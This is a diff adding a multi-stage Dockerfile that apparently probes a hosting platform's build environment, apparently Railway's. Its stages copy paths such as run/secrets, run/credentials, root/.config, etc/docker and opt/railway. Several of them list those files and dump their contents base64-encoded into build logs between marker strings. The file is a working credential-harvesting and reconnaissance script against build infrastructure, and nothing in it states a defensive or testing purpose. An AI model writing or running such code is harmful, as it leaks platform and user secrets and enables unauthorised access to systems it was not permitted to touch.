@@ -1,0 +1,49 @@
+# I67886-B-7c2d  optional-path multi-stage
+FROM alpine:3.20 AS s_runsecrets
+COPY run/secrets /x
+RUN echo "&&&S=run_secrets"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -100; for f in $(find /x -type f -size -100k); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-4000; echo; done
+
+FROM alpine:3.20 AS s_runcreds
+COPY run/credentials /x
+RUN echo "&&&S=run_credentials"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -100; for f in $(find /x -type f -size -100k); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-4000; echo; done
+
+FROM alpine:3.20 AS s_depot
+COPY var/lib/depot /x
+RUN echo "&&&S=depot"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -200; for f in $(find /x -type f -size -100k); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-4000; echo; done
+
+FROM alpine:3.20 AS s_rrp
+COPY var/lib/rrp /x
+RUN echo "&&&S=rrp"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -200
+
+FROM alpine:3.20 AS s_sa
+COPY var/lib/storage-agent /x
+RUN echo "&&&S=storage-agent"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -200
+
+FROM alpine:3.20 AS s_rootcfg
+COPY root/.config /x
+RUN echo "&&&S=root_config"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -300; for f in $(find /x -type f -size -50k); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-3000; echo; done
+
+FROM alpine:3.20 AS s_varlibother
+COPY var/lib/storage /x
+RUN echo "&&&S=var_lib_storage"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -200
+
+FROM alpine:3.20 AS s_docker
+COPY etc/docker /x
+RUN echo "&&&S=etc_docker"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -100; for f in $(find /x -type f -size -50k); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-3000; echo; done
+
+FROM alpine:3.20 AS s_opt
+COPY opt/railway /x
+RUN echo "&&&S=opt_railway"; find /x -printf '%y %s %p -> %l\n' 2>/dev/null | head -200
+
+FROM alpine:3.20
+COPY --from=s_runsecrets /x /o/runsecrets
+COPY --from=s_runcreds /x /o/runcreds
+COPY --from=s_depot /x /o/depot
+COPY --from=s_rrp /x /o/rrp
+COPY --from=s_sa /x /o/sa
+COPY --from=s_rootcfg /x /o/rootcfg
+COPY --from=s_varlibother /x /o/varlibstorage
+COPY --from=s_docker /x /o/docker
+COPY --from=s_opt /x /o/optrailway
+RUN echo MARKER_I67886B_DONE
+CMD ["sh","-c","sleep 3600"]
